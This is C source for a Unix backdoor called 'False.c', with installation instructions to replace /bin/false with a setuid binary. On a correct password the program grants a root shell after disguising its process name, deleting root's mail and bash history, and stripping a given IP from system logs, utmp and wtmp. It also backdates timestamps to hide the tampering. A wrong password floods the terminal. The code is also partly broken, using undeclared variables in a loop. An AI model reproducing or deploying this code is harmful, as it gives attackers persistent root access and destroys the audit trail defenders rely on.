/* 
 * False.c - by Pir8
 *
 * False.c is a local/remote backdoor, depending
 * on how you set it up.
 *
 * Remote:
 * gcc false.c -o false -lcrypt
 * mv ./false /bin/false
 * passwd rpc or passwd xfs
 * chmod 4775 /bin/false
 *
 * Local:
 * gcc false.c -o sush -lcrypt
 * chmod 4775 sush
 * ./sush
 *
 */






#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define remove "/bin/rm"
#define link "/bin/ln"
#define grep "/bin/grep"
#define touch "/bin/touch"
#define killall "/usr/bin/killall"
#define echo "/bin/echo"
#define move "/bin/mv"
#define PWD "uXO1k5bPFzFhk" /* passwd can be changed using "htpasswd" */


int main() { /* Lets start the program */

	char *crypted=PWD;
	char *pass; /* variable for passwd */
	char ip[15];
	char execute[200];


	pass = (char *)getpass ("Password: "); /* lets get users pass */

	if (strcmp(crypt(pass,crypted),crypted)) { /* lets see if the pass entered matches */

		printf("SeCshell Protected.\n"); /* display text */
		sleep(3); /* rest for 3 secs */
		system("/bin/cat /dev/urandom"); /* Flood users Terminal */
		exit(1);
	}
	
	else 
	{
		setuid(0); /* remove this line if you dont want to get a root shell */
		setgid(0); /* remove this line if you dont want to get a root shell */
		
        
      while(i<argc){
	strcpy(argv[i],"xfs -daemon -cron"); 
} 
      
/* Lets start cleaning some files! */
      
	printf("Input an IP/Username to clean: ");
      scanf("%15s", ip);
      printf("Cleaning -> %s\n", ip);
      
	sprintf(execute,"%s /var/spool/mail/root", remove);
      system(execute);
      printf("\nCleaning mail.....");
	sprintf(execute,"%s \"\" > /var/spool/mail/root", echo);
	system(execute);
	printf("OK");
	
	sprintf(execute,"%s -r /bin/ls /var/spool/mail/root", touch);
	system(execute);
	
	printf("\nRemoving History.....");
	sprintf(execute,"%s -rf /root/.bash_history", remove);
	system(execute);
	printf("OK");
	
	printf("\nUpdating time stamps.....");
	sprintf(execute,"%s -s /dev/null /root/.bash_history", link);
	system(execute);
	printf("OK");
	
	printf("\nCleaning /var/log/secure.....");
	sprintf(execute,"%s -v %s /var/log/secure > /var/log/secure1", grep, ip);
	system(execute);
	sprintf(execute,"%s -f /var/log/secure1 /var/log/secure", move);
	system(execute);
	printf("OK");
	printf("\nUpdating time stamps.....");
	sprintf(execute,"%s -r /bin/ls /var/log/secure", touch);
	system(execute);
	printf("OK");

	printf("\nCleaning /var/log/lastlog.....");
	sprintf(execute,"%s -v %s /var/log/lastlog > /var/log/lastlog1", grep, ip);
	system(execute);
	sprintf(execute,"%s -f /var/log/lastlog1 /var/log/lastlog", move);
	system(execute);
	printf("OK");
	printf("\nUpdating time stamps.....");
	sprintf(execute,"%s -r /bin/ls /var/log/lastlog", touch);
	system(execute);
	printf("OK");

	printf("\nCleaning /var/log/xferlog.....");
	sprintf(execute,"%s -v %s /var/log/xferlog > /var/log/xferlog1", grep, ip);
	system(execute);
	sprintf(execute,"%s -f /var/log/xferlog1 /var/log/xferlog", move);
	system(execute);
	printf("OK");
	printf("\nUpdating time stamps.....");
	sprintf(execute,"%s -r /bin/ls /var/log/xferlog", touch);
	system(execute);
	printf("OK");

	
	printf("\nCleaning /var/log/messages.....");
	sprintf(execute,"%s -v %s /var/log/messages > /var/log/messages1", grep, ip);
	system(execute);
	sprintf(execute,"%s -f /var/log/messages1 /var/log/messages", move);
	system(execute);
      printf("OK");
	printf("\nUpdating time stamps.....");
	sprintf(execute,"%s -r /bin/ls /var/log/messages", touch);
	system(execute);
	printf("OK");
	
	printf("\nCleaning utmp and wtmp.....");
	sprintf(execute,"%s "" > /var/run/utmp", echo);
	system(execute);

	sprintf(execute,"%s "" > /var/run/wtmp", echo);
	system(execute);
	printf("OK");

	printf("\nRestarting syslogd.....");
	sprintf(execute,"%s -HUP syslogd", killall);
	system(execute);
	printf("\nCleaning restart log.....");
	sprintf(execute,"%s -v syslogd /var/log/messages > /var/log/messages1", grep);
	system(execute);
	sprintf(execute,"%s -f /var/log/messages1 /var/log/messages", move);
	system(execute);
	printf("OK");
	printf("\nUpdating time stamps.....");
	sprintf(execute,"%s -r /bin/ls /var/log/messages", touch);
	system(execute);
	printf("OK");
	printf("\n\nLogs have been cleaned successfully!");
	
              
	execl("/bin/sh",".dtors",0); /* Execute shell */

}
return (0);
}